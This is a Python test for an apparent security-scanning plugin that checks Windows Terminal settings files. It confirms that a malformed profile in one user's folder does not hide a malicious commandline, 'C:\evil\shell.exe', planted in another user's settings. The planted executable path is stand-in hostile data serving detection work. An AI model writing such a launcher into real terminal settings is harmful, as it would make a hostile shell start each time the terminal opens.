def test_one_crafted_profile_does_not_blind_other_users(tmp_path: Path) -> None:
    """A hostile settings.json in an earlier user must not kill the whole check."""
    plugin = _terminal_plugin(tmp_path, "alice", "bob")
    _write_settings(plugin, "alice", _PACKAGED, json.dumps({"profiles": []}))
    _write_settings(
        plugin,
        "bob",
        _PACKAGED,
        json.dumps({"profiles": {"list": [{"commandline": "C:\\evil\\shell.exe"}]}}),
    )
    findings = plugin.run()
    assert [finding.value for finding in findings] == ["C:\\evil\\shell.exe"]
    assert findings[0].path == f"Users\\bob\\{_PACKAGED}"


